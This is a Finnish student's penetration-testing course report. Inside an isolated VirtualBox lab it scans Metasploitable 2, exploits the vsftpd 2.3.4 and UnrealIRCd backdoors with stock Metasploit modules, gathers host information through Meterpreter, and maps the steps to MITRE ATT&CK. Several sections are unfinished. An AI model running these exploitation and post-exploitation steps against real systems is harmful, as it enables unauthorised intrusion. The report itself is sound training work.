_Kurssi: Tunkeutumistestaus ICI005AS3A-3007_

_Tekijä: Henri Äikäs_

_Alusta: Windows 11 / Kali Linux (VirtualBox) / Metasploitable 2 (VirtualBox)_

_Päivämäärä: 3.9.2026_

_Tämä raportti on osa Haaga-Helian Tunkeutumistestaus -kurssia syksyllä 2026. Tehtävänanto on h3 EternalHomework. Opettajana toimi Tero Karvinen._

________________________________________________________________________________________________________________________________________________________________________________________


### x) Lue/katso/kuuntele ja tiivistä
€ Jaswal 2020: Mastering Metasploit - 4ed: Chapter 1: Approaching a Penetration Test Using Metasploit (Conducting a penetration test with Metasploit)

Mitä 'nmap -sn' tekee? Älä arvaa, vaan perustele lähteillä. Mistä tiedät, että käyttämäsi lähde on luotettava?

________________________________________________________________________________________________________________________________________________________________________________________

### Metasploitin asentaminen ja tietokannan alustaminen

Tutustuin aluksi [Kalin Metasploit dokumenttiin](https://www.kali.org/tools/metasploit-framework/). Aloitin asentamalla Metasploitin ja käynnistämällä sen 

    sudo apt install metasploit-framework
    msfconsole

Tämä käynnisti Metasploitin. 


<img width="691" height="453" alt="METASPLOIT BANNER" src="https://github.com/user-attachments/assets/72e08789-56e2-4be4-aa0c-04fc0a4fb322" /> <br><br>

Tehtävät tarvitsivat myös tietokannan, jotta löydetyt hostit ja palvelut voitaisiin tallentaa. [Kalin dokumentoinnista]([Metasploit Framework](https://www.kali.org/docs/tools/starting-metasploit-framework-in-kali/)) löysin yksinkertaisen komennon PostgreSQL-tietokannan alustamiseen ja sen yhdistämiseen Metasploittiin.

    sudo msfdb init
    ### Ja tarkistettiin tilanne
    db_status

Tietokanta alustettiin poistumalla ensin Metasploitista, ajamalla init ja tarkistamalla status Metasploitissa.

________________________________________________________________________________________________________________________________________________________________________________________

### b) Tallenna porttiskannauksen tuloksia Metasploitin tietokantoihin. Skannaa niin, että Metasploitable tulee mukaan. Kannattaa ottaa mukaan ainakin versioskannaus -sV (joka on banner grabbing plus).

Aluksi tarkastin verkkoasetukseni: Kalin sekä Metasploitablen verkkoadapterit olivat vaihdettu Host-Only -moodiin ja ne pystyivät pingaamaan toisiaan mutta kummallakaan ei ollut pääsyä internettiin.


<img width="627" height="242" alt="PING TEST" src="https://github.com/user-attachments/assets/20a32390-8918-4389-a247-c22eb125cc06" /> <br><br>

Seuraavaksi oli aika suorittaa porttiskannaus. Tämä tapahtui komennolla ```db_nmap -sV <METASPLOITABLEN IP-OSOITE>```. 
- db_nmap suorittaa porttiskannauksen ja tallentaa tulokset tietokantaan (db).
- -sV suorittaa version detectionin, eli hakee palveluiden versiot. 

Sain DNS-varoituksen, sillä Kalilla ei ollut verkkoyhteyttä mutta koska skannaus kohdennettin suoraan tiettyyn IP-osoitteeseen pystyi varoituksen sivuuttamaan. Toiminto ajettiin normaalisti loppuun ja tulosteessa oli porttiskannauksen tiedot. Koska käytin ```db_nmap``` -komentoa, tulokset tallentuivat tietokantaan. 

Tallentuminen tietokantaan voitiin varmentaa ```hosts``` ja ```services``` -komennoilla. 

________________________________________________________________________________________________________________________________________________________________________________________

### c) Tarkastele Metasploitin tietokantoihin tallennettuja tietoja komennoilla "hosts" ja "services". Kokeile suodattaa näitä listoja tai hakea niistä.


Komennolla ```hosts``` pystyttiin tarkastelemaan skannauksessa löydettyjä laitteita, eli tässä tapauksessa Metasploitable konetta. Tietoon tallentuivat IP- ja MAC-osoite sekä veikkaus käyttöjärjestelmästä ja käyttötarkoituksesta (_Linux & server_). Jos hosteja olisi useampi, voitaisiin etsiä tietty haluttu host komennolla

    hosts -S <IP-OSOITE>

<br> <img width="823" height="151" alt="HOSTS" src="https://github.com/user-attachments/assets/aa1fa8b9-8522-443b-8025-d2610d0b0108" /> <br>

Komennolla ```services``` saatiin esiin kyseisen hostin käyttämät palvelut ja avoimet portit. -sV parametrin ansiosta myös palveluiden versiot olivat näkyvissä. 

<br> <img width="852" height="407" alt="SERVICES" src="https://github.com/user-attachments/assets/ec0fd0b9-6d7e-4543-87e8-5a22dbe28310" /> <br>

Palveluita pystyi helposti suodattamaan joko palvelun tai portin perusteella. 

    sevices -S <palvelu>
    services -p 80

<br> <img width="850" height="168" alt="SSH" src="https://github.com/user-attachments/assets/eac3c183-4651-4337-acee-78684866f967" /> <br>

<br> <img width="841" height="95" alt="PORT 80" src="https://github.com/user-attachments/assets/7a984247-e1c1-412c-b521-58e29fd96a1a" /> <br>


________________________________________________________________________________________________________________________________________________________________________________________

### d) Internet famous. Etsi Metasploitablen mukana tulevista hyökkäyksistä (en: exploits; search) sellainen, joka on ollut julkisuudessa.

Valitsin **vsftpd 2.3.4 portissa 21**. Kyseinen exploit voitiin etsiä ```search vsftpd```, jolloin Metasploit palautti kaikki vsftpd -exploitit. Haluttua backdoor exploittia pystyi tutkimaan vielä tarkemin komennolla ```info exploit/unix/ftp/vsftpd_234_backdoor```.

<br> <img width="760" height="431" alt="VSFTPD exploit" src="https://github.com/user-attachments/assets/9f5b1499-9ed5-4587-83dd-d6eafa421b5f" /> <br>


________________________________________________________________________________________________________________________________________________________________________________________

### e) Vertaile nmap:n omaa tiedostoon tallennusta (-oA foo) ja db_nmap:n tallennusta tietokantoihin. Mitkä ovat eri tiedostomuotojen ja Metasploitin tietokannan hyvät puolet?

**Nmapin -oA** tallentaa skannauksen kolmeen eri tiedostomuotoon: .nmap, .xml ja .gnmap. ([Ping Labz.](https://www.pinglabz.com/nmap-output-formats/)
- .nmap on helposti ihmisen luettava
- .xml soveltuu ohjelmalliseen käsittelyyn
- .gnmap komentorivipohjaiseen tietojen poimintaan.

Eri tiedostomuotojen tallentamisen hyötynä on se, että kaikki tulokset ovat helposti arkistoitavissa ja käytettävissä myös ilman Metasploitia.

**db_nmap** puolestaan tallentaa skannauksen tulokset Metasploitin tietokantaan. Tietoja voidaan käsitellä ja suodattaa esimerkiksi erilaisilla hosts- ja services-komennoilla kuten ylemmässä tehtävässä tehtiin. Tietokannan etuna on, että skannaustulokset ovat suoraan Metasploitin muun työskentelyn käytettävissä ja niihin voidaan yhdistää esimerkiksi haavoittuvuuksia ja muita penetration testing -prosessissa kerättyjä tietoja.

Yhteenvetona: Nmapin tiedostot ovat parempia tulosten tallentamiseen, jakamiseen ja muiden työkalujen kanssa käytettäväksi, kun taas Metasploitin tietokanta on parempi silloin, kun tuloksia halutaan hyödyntää osana laajempaa Metasploit-pohjaista testausta.


________________________________________________________________________________________________________________________________________________________________________________________


### f) Murtaudu Metasploitablen vsftpd-palveluun

Metasploitissa oli valmis exploit kyseiseen palveluun, joten hyökkääminen oli yksinkertaista. Ensin valittiin hyökkäyksen kohteeksi haluttu palvelu, sitten exploit ja asetettiin kohde.

    search vsftpd
    use exploit/unix/ftp/vsftpd_234_backdoor
    set RHOST <METASPLOITABLE 2 IP-OSOITE>
    run

Sain kuitenkin virheilmoituksen: _"Msf: OptionValidateError one or more options failed to validate: LHOST."_.

<br> <img width="855" height="147" alt="LHOST OSOITE" src="https://github.com/user-attachments/assets/53e9d76c-161c-49c7-b254-e85140b323d1" /> <br>

Tämä johtui siitä, että Metasploitille ei oltu vielä määritetty _Local Host (LHOST)_  IP-osoitetta, eli tässä tapauksessa Kali-koneen osoitetta. Sain määritettyä sen komennolla ```set LHOST <KALIN IP-OSOITE>```. 

Tämän korjauksen jälkeen exploit komennot uudestaan onnistuneesti. 


<br> <img width="844" height="149" alt="BACKDOOR HAS SPAWNNED" src="https://github.com/user-attachments/assets/6080dcc4-d739-41cb-a469-10d924955c89" /> <br>


________________________________________________________________________________________________________________________________________________________________________________________


### g) Kerää levittäytymisessä (lateral movement) tarvittavaa tietoa metasploitablesta. Analysoi tiedot. Selitä, miten niitä voisi hyödyntää.

Yritin seuraavaksi lähteä hakemaan tietoa kohdekoneesta komennoilla ```whoami``` ja ```hostname```. Nämä eivät kuitenkaan toimineet vaan palauttivat _"Unknown command"_ virheilmoitukset. LÄHDE löytyi, että meterpreter tottelee eri käskyjä:

    getuid
    sysinfo

<br> <img width="466" height="132" alt="image" src="https://github.com/user-attachments/assets/f188c0ec-380c-46de-ac51-b04f493d340f" /> <br>

Ylemmät komennot kertoivat, että kohdekoneen hostname oli metasploitable.localadmin ja sen käyttöjärjestelmä oli Ubuntu 8.04, jossa pyöri Linux 2.6.24-16.server. Lisäksi Meterpreter toimi root-oikeuksin. Root-oikeudet mahdollistavat hyökkääjälle laajat valtuudet etsiä tietoa käyttäjistä, palveluista ja tiedoista. Se myös helpottaa muiden kohteiden tai tietojen löytämistä.

Hain verkkotiedot ```ipconfig``` komennolla. Se kertoi missä aliverkossa kone on. ```arp``` -komennolla saatiin välimuistissa olevat IP-osoitteet. 

<br> <img width="546" height="410" alt="image" src="https://github.com/user-attachments/assets/fe03da71-481b-4e89-8fcb-89e241d4cd19" /> <br>


Kerätyillä tiedoilla hyökkääjän olisi täten mahdollistaa alkaa muodostamaan kuvaa millaisessa ympäristö toimitaan. Käyttöjärjestelmä, oikeudet, verkko ja mitä laitteita se on havainnut ovat kaikki hyödyllistä tietoa hyökkääjän kannalta, joita voidaan hyödyntää lateral movement -polun suunnitteluun.
________________________________________________________________________________________________________________________________________________________________________________________


### h) Murtaudu Metasploitableen jollain toisella tavalla. (Jos tämä kohta on vaikea, voit tarvittaessa turvautua verkosta löytyviin läpikävelyohjeisiin. Merkitse silloin raporttiin, missä määrin tarvitsit niitä).

Tutustuin tunnettuihin Metasploitablen haavoittuvuuksiin ja löysin IRC-palvelun, joka löytyi portista 6667. Kyseessä oli UnrealIRCd, johon Metasploitissa oli valmis hyökkäys. Exploitissa hyödynnettiin backdooria, jonka avulla saatiin pääsy kohdekoneelle. Askeleet olivat hyvin samankaltaiset kuin aiemmassa vsftpd-hyökkäyksessä.


    search unreal ircd
    use exploit/unix/irc/unreal_ircd_3281_backdoor
    set <METASPLOITABLEN IP-OSOITE>
    run

<br> <img width="1002" height="679" alt="image" src="https://github.com/user-attachments/assets/a944aed2-3ee1-4f26-8ecb-9b83dfea0b82" /> <br>


________________________________________________________________________________________________________________________________________________________________________________________

### i) Demonstroi Meterpretrin ominaisuuksia.

Meterpreter on Metasploit Frameworkin tarjoama hyökkäyksen jälkeiseen toimintaan tarkoitettu payload, jonka avulla kohdejärjestelmää voidaan hallita ja siitä voidaan kerätä tietoa. [(StationX.)](https://www.stationx.net/meterpreter-commands/)


sysinfo
 - Hakee tietoa kohdejärjestelmästä. Esimerkiksi käyttöjärjestelmän.

getuid
- Kertoo, millaisella käyttäjällä ja oikeuksilla ollaan sisällä.

ipconfig, route ja arp
- Kohdekoneen verkkoympäristön tutkimiseen. Voidaan selvittää esimerkiksi koneen IP-osoitteita, reitityksiä ja muita verkossa havaittuja laitteita.

ps 
- Voidaan tarkastella kohdekoneella käynnissä olevia prosesseja. Tämä voi auttaa selvittämään, mitä ohjelmia ja palveluita järjestelmässä on käytössä.

background & sessions
- Istunto voidaan siirtää taustalle ja aktiivisia istuntoja voidaan selata ```sessions``` -komennolla ja palata haluttuun sessioon.

<br> <img width="985" height="291" alt="image" src="https://github.com/user-attachments/assets/08e7d883-05a6-4dce-b328-ee37f9f5054e" /> <br>


```shell``` -komennolla voidaan avata tavallinen komentotulkki Meterpreterin sisällä. Komentotulkilla voidaan käyttää Linuxin normaaleja komentoja, kuten whoami, hostname ja uname -a. ```exit``` -komennolla voidaan palata takaisin Meterpretreriin.

<br> <img width="681" height="97" alt="image" src="https://github.com/user-attachments/assets/99093a26-255a-488d-ae78-3bf7c5f8f758" /> <br>


________________________________________________________________________________________________________________________________________________________________________________________

### j) Tallenna shell-sessio tekstitiedostoon script-työkalulla (script -fa log001.txt) tai tmux:lla.

Avasin Meterpreterissä normaalin komentotulkin ```shell``` -komennolla ja käynnistin scriptaus työkalun ```script -fa log001.txt```. 
- Scripti tallentaa istunnon tulosteet komennossa määritettyyn tekstitiedostoon.
- -f kirjoittaa tiedostoon välittömästi
- -a lisää uudet tiedot tiedoston loppuun sen sijaan, että korvaisi tiedoston joka kerta

Käytin tallennuksen aikana jo ylempää tuttuja komentoja, _whoami, hostname, uname -a & ip a_. Tallennuksen sai lopetettua ```exit``` -komennolla. 

<br> <img width="982" height="325" alt="CAT LOG001.TXT" src="https://github.com/user-attachments/assets/be71e941-7623-41ba-9dd2-92c4cd3c698e" /> <br>
 

Hyötynä tässä on se, että hyökkäyksen aikana tehdyt komennot ja niiden tulosteet voidaan helposti tallentaa myöhempää analyysiä varten.

________________________________________________________________________________________________________________________________________________________________________________________

### k) Pivot point. Laita kaikki harjoituksen tiedostot (script -fa, nmap -oA...) samaan kansioon. Hae sopiva pivot point (sovellus, versio, osoite, MAC-numero) 'grep -r' -komennolla. Keksi uskottava esimerkkikysymys, johon haet vastausta.

3


________________________________________________________________________________________________________________________________________________________________________________________

### l) Attaaack! Mitä Mitre Attack taktiikoita ja tekniikoita käytit tässä harjoituksessa?

[(Mitre)](https://attack.mitre.org/)

| Taktiikka| Tekniikka | Harjoitus |
|---|---|---|
| Reconnaissance | T1595 Active Scanning | Nmap-skannaus |
| Discovery | T1046 Network Service Scanning | Avoimien porttien ja palveluiden selvittäminen |
| Initial Access | T1190 Exploit Public Facing Application | vsftpd 2.3.4 -backdoor hyödyntäminen |
| Initial Access | T1190 Exploit Public Facing Application | UnrealIRCd -backdoor hyödyntäminen |
| Discovery | T1016 System Network Configuration Discovery | ipconfig -komennolla verkkoyhteyksien selvittäminen |
| Discovery | T1082 – System Information Discovery | sysinfo-komennolla käyttöjärjestelmän ja järjestelmän tietojen selvittäminen |
Discovery | T1046 – Network Service Scanning | Muiden verkossa havaittujen koneiden tutkiminen Nmapilla |
| Command and Control | T1059 – Command and Scripting Interpreter | Meterpreteristä shell-komennolla Linux-shellin avaaminen | 
________________________________________________________________________________________________________________________________________________________________________________________

### Lähteet

Karvinen, T. Tunkeutumistestaus kurssimateriaali. 2026. Luettavissa: https://terokarvinen.com/tunkeutumistestaus/#h3-eternalhomework. Luettu 4.9.2026.

Metasploit-framework. Kali.org. Luettavissa: https://www.kali.org/tools/metasploit-framework/. Luettu 4.9.2026.

Metasploit Framework docs. Kali.org. 2025. ttps://www.kali.org/docs/tools/starting-metasploit-framework-in-kali/. Luettu 4.9.2026.

Nmap Cheat Sheet. GeeksForGeeks. 2025. Luettavissa: https://www.geeksforgeeks.org/ethical-hacking/nmap-cheat-sheet/. Luettu 4.9.2026.

Nmap Output Formats: -oN, -oX, -oG, -oA and Parsing Results. Ping Labz. 2026. Luettavissa: https://www.pinglabz.com/nmap-output-formats/. Luettu 4.9.2026.

Lee, C. Meterpreter Commands List. Station X. Luettavissa: https://www.stationx.net/meterpreter-commands/. Luettu 4.9.2026.

ATT&CK Matrix for Enterprise. Mitre. Luettavissa: https://attack.mitre.org/. Luettu 4.9.2026.

